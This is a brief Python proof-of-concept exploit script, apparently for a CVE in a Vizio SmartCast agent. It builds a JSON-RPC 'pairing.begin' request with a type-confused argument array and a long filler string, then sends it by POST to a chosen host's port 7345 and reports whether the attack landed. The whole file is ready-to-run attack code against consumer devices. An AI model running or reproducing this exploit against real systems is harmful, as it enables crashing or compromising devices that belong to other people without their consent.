#!/usr/bin/env python3
"""CVE-2025-22450 — Vizio SmartCast Agent. JSON-RPC command with a type
confusion in an argument array. POST to the cast API."""
import json, sys, urllib.request

def build() -> bytes:
    return json.dumps({
        "jsonrpc": "2.0", "id": 1, "method": "pairing.begin",
        "params": {"deviceName": "poc", "type": ["string", 0x7FFFFFFF],
                   "extra": "A" * 1024}}).encode()

def exploit(host, port=7345):
    url = f"http://{host}:{port}/jsonrpc"
    req = urllib.request.Request(url, data=build(),
                                 headers={"Content-Type": "application/json"}, method="POST")
    try:
        with urllib.request.urlopen(req, timeout=6) as r:
            print(f"[+] CVE-2025-22450 {url} -> {r.status}")
            return r.status == 200
    except Exception as e:
        print(f"[-] {e}"); return False

def main():
    if len(sys.argv) > 1: exploit(sys.argv[1])
    else:
        from pathlib import Path
        Path("cve-2025-22450.json").write_bytes(build()); print("[+] payload written")

if __name__ == "__main__":
    main()
